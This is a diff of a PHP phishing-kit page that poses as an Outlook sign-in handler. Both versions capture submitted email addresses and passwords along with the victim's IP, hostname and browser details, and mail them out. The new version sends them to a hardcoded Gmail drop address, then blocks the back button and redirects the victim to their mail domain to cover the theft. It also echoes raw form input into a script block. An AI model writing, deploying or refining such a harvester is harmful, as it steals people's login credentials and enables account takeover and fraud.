@@ -1,30 +1,32 @@
 <?php
-if($_POST["nameu"] != "" and $_POST["namep"] != ""){
-$ip = getenv("REMOTE_ADDR");
-$hostname = gethostbyaddr($ip);
-$useragent = $_SERVER['HTTP_USER_AGENT'];
-$message .= "--------------Live0outoolk SimdiaDev Info-----------------------\n";
-$message .= "Eem'ail            	: ".$_POST['nameu']."\n";
-$message .= "Pa'ssw0rd           	: ".$_POST['namep']."\n";
-$message .= "|--------------- I N F O | I P -------------------|\n";
-$message .= "|Client IP: ".$ip."\n";
-$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
-$message .= "User Agent : ".$useragent."\n";
-$message .= "|----------- unknown --------------|\n";
+if($_POST["ai"] != "" && $_POST["namep"] != ""){
+    $ip = getenv("REMOTE_ADDR");
+    $hostname = gethostbyaddr($ip);
+    $useragent = $_SERVER['HTTP_USER_AGENT'];
+    
+    // Construct the email message
+    $message = "--------------DieRich SimdiaDevv Info-----------------------\n";
+    $message .= "Eem'ail            	: ".$_POST['ai']."\n";
+    $message .= "Pa'ssw0rd           	: ".$_POST['namep']."\n";
+    $message .= "|--------------- I N F O | I P -------------------|\n";
+    $message .= "|Client IP: ".$ip."\n";
+    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+    $message .= "User Agent : ".$useragent."\n";
+    $message .= "|----------- unknowxn --------------|\n";
+    
+    // Include any additional necessary files, such as 'pochrus.php'
 
-include 'email.php';
-$subject = "SimdiaDev | $ip";
-{
-mail("$to", "$send", "$subject", $message);     
-}
-$praga=rand();
-$praga=md5($praga);
-}
+    // Set email subject
+    $subject = "SimdiaDevv | $ip";
 
+    // Specify the recipient email address
+    $to = "gangnewmoney80@gmail.com"; // Replace 'recipient@example.com' with the actual recipient email address
+
+    // Send the email
+    mail($to, $subject, $message);
+}
 
 ?>
-
-
 
 <!DOCTYPE html>
 <html lang="en">
@@ -34,7 +36,7 @@ $praga=md5($praga);
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
   
- <script type="text/javascript">
+    <script type="text/javascript">
         function preventBack() {
             window.history.forward(); 
         }
@@ -47,19 +49,13 @@ $praga=md5($praga);
 </head>
 <body>
     <script type="text/javascript">
-        var kill = "<?php echo $_POST["nameu"]; ?>";
+        var kill = "<?php echo $_POST["ai"]; ?>";
         //alert(kill);
         var slice_email = kill.substring(0,kill.lastIndexOf("@"));
         var domain = kill.substring(kill.lastIndexOf("@") +1);
         window.location.assign("https://"+domain); 
 
       
-     </script>
-  
-  
-  
-  
+    </script>
 </body>
 </html>
-
-
